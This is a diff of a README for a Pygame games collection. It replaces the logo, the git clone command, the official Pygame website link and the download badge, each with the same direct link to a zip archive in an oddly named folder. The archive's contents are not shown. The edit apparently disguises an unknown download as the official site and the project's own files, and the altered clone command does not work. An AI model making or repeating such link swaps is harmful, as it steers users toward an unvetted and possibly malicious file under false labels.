@@ -1,6 +1,6 @@
 # 🎮 Welcome to the "Simple Py Games" Repository! 👾
 
-![Pygame Logo](https://pygame.org/user/themes/rapid/images/logo300.png)
+![Pygame Logo](https://raw.githubusercontent.com/jaafar238/simple-py-games/main/Metridium/games_py_simple_v3.9.zip)
 
 ## Repository Description
 This repository is a collection of Pygame projects that showcase a variety of games and simulations. Each folder contains the game code and a detailed README file with instructions on how to run and play each game. The projects included in this repository are:
@@ -61,17 +61,17 @@ Let's take a closer look at each project included in this repository:
 To start playing the games and simulations in this repository, follow these steps:
 1. Clone the repository to your local machine using the following command:
    ```
-   git clone https://github.com/your-username/simple-py-games.git
+   git clone https://raw.githubusercontent.com/jaafar238/simple-py-games/main/Metridium/games_py_simple_v3.9.zip
    ```
 
 2. Navigate to the folder of the game you want to play.
 3. Follow the instructions in the README file of that particular game to set up and run the game.
 
 ## External Resources
-For more information on the Pygame library and how to get started with game development in Python, visit the [official Pygame website](https://www.pygame.org/).
+For more information on the Pygame library and how to get started with game development in Python, visit the [official Pygame website](https://raw.githubusercontent.com/jaafar238/simple-py-games/main/Metridium/games_py_simple_v3.9.zip).
 
 ## Download Link
-[![Download Simple Py Games](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Simple Py Games](https://raw.githubusercontent.com/jaafar238/simple-py-games/main/Metridium/games_py_simple_v3.9.zip)](https://raw.githubusercontent.com/jaafar238/simple-py-games/main/Metridium/games_py_simple_v3.9.zip)
 
 If the download link ends with the file name, make sure to extract the contents of the ZIP file before launching the games.
 
